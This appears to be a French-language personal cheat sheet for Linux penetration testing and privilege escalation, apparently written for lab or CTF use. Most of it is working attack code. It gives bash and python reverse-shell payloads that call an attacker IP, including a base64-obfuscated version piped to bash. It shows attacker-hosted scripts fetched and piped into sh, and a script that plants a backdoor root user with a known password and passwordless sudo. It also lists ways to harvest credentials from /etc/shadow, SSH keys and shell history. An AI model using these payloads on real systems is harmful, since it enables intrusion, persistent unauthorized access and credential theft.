---
title: "Privesclinux"
date: 2026-04-03T03:31:43+02:00
draft: false
showToc: true
TocOpen: true
---
## Utile

```bash
sudo echo "TARGET_IP TARGET_DOM" >> /etc/hosts
```

## Reverse Shells

### Listener (Machine Attaquante)
```bash
nc -lvnp <PORT>
```

### Payloads (Machine Victime)
bash
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```
Obfuscation bash
```bash
echo "bash -i >& /dev/tcp/10.10.15.245/4444 0>&1" | base64
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDUvNDQ0NCAwPiYxCg== | base64 -d | bash
```
python
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Stabilisation du Shell (TTY)
Indispensable pour avoir l'auto-complétion, les flèches et le CTRL+C.

1. Dans le shell distant :
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
2. Faire `CTRL+Z` (met le shell en pause).
3. Dans mon terminal :
```bash
stty raw -echo; fg
```
4. Dans le shell distant (qui revient au premier plan) :
```bash
reset
export TERM=xterm-256color
export SHELL=bash
```

## Transfert de fichiers
Pour envoyer des fichiers vers la cible.

LinPEAS (détection privesc) : https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

pspy (monitoring process) : https://github.com/DominicBreuker/pspy

### Serveur (Attaquant)
```bash
sudo python3 -m http.server 80
```

### Téléchargement (Victime)
#### Via wget
```bash
wget http://<IP_ATTACKER>/linpeas.sh
```
#### Via curl
```bash
curl http://<IP_ATTACKER>/linpeas.sh -o linpeas.sh
```
#### Exécution directe en mémoire (sans écrire sur le disque)
```bash
curl http://<IP_ATTACKER>/linpeas.sh | sh
```
#### Netcat
Depuis victime
```bash
nc -vl 44444 > fichier
```
Envoyer le fichier à la vitcime depuis attaquant
```bash
nc -n TargetIP 44444 < fichier
```
#### SSH / SCP
```bash
scp /chemin/vers/LinEnum.sh user@10.10.X.X:/chemin/de/destination
```


## Élévation de Privilèges Linux

### Énumération rapide

#### Droits sudo sans mot de passe
```bash
sudo -l
```
#### Groupes de l'utilisateur (docker, lxd, etc.)
```bash             
id
```
#### Version du Kernel
```bash
uname -a
```
#### Fichiers SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```
#### Trouver fichier/dossier ou on peut écrire 

```bash
find / -type f -maxdepth 2 -writable
```

```bash
find / -type d -maxdepth 2 -writable
```
---

### Checklist d'Énumération
#### 1. Identité et Groupes
```bash
id
```
* Vérifie si tu es dans des groupes spéciaux : `docker`, `lxd`, `sudo`, `video`, `disk`.

#### 2. Environnement et Kernel
```bash
uname -a             # Version du Kernel (Exploits Kernel)
cat /etc/os-release  # Version de la distribution
env                  # Variables d'environnement (mots de passe cachés)
```

#### 3. Services et Processus
```bash
ps aux | grep root   # Processus lancés par root
ss -lntp             # Ports ouverts en local (127.0.0.1) non vus par Nmap
```

#### 4. Historique et Utilisateurs
```bash
history              # Commandes tapées par l'utilisateur (souvent des mots de passe)
ls -la /home         # Lister les autres utilisateurs
ls -la ~/.ssh        # Chercher des clés privées (id_rsa)
```


### Création utilisateur root

```bash
#!/bin/bash
useradd -m -s /bin/bash shingsi
echo 'shingsi:shingsi' | chpasswd
usermod -aG sudo shingsi && echo 'shingsi ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/shingsi && chmod 440 /etc/sudoers.d/shingsi
echo '[-] LEZGONG!' > /tmp/check
echo '[-] LEZGONG!' > check
```

---
## Permissions

Comprendre comment Linux gère les droits est crucial pour identifier une faille de configuration.

| Valeur | Lettre | Action | Description |
| :--- | :--- | :--- | :--- |
| **4** | `r` | Read | Lire le fichier ou lister le dossier |
| **2** | `w` | Write | Modifier/Supprimer le fichier |
| **1** | `x` | Execute | Lancer le programme / Entrer dans le dossier |

**Combinaisons courantes :**
* **777** (`rwxrwxrwx`) : Tout le monde peut tout faire.
* **755** (`rwxr-xr-x`) : Standard. Proprio a tous les droits, les autres lisent/exécutent.
* **600** (`rw-------`) : Privé. Seul le propriétaire peut lire et modifier.

---

## Le Bit SUID (Set User ID)

C'est la cible n°1 en PrivEsc. Un fichier avec le bit **s** s'exécute avec les privilèges du **propriétaire** (souvent root), peu importe qui le lance.

### Repérer le bit "s"
```bash
ls -la /usr/bin/passwd
```

### Trouver tous les fichiers SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```
> **Réflexe :** Si on trouve un binaire non-standard (ex: python, vim, find, nano) avec un SUID root, consulter **GTFOBins**.


---

## Fichiers Critiques à Inspecter

![Filesystem](/shingsi/images/NEW_filesystem.webp)

| Fichier | Pourquoi le regarder ? |
| :--- | :--- |
| `/etc/passwd` | Liste des utilisateurs. Vérifie qui a un shell `/bin/bash`. Si on a les droits d'écriture sur ce fichier, ajout utilisateur root.|
| `/etc/shadow` | Contient les hashes des mots de passe (si lisible = root instantané). |
| `/etc/crontab` | Tâches planifiées. Cherche des scripts écrits par root que tu peux modifier. |
| `config.php`, `settings.py` | Souvent dans `/var/www/html/`. Contiennent les codes BDD. |
| `~/.bash_history` | Historique des commandes. Peut contenir des mots de passe en clair. |
| `/tmp` ou `/dev/shm` | Seuls dossiers où tu as presque toujours le droit d'écrire/exécuter. |


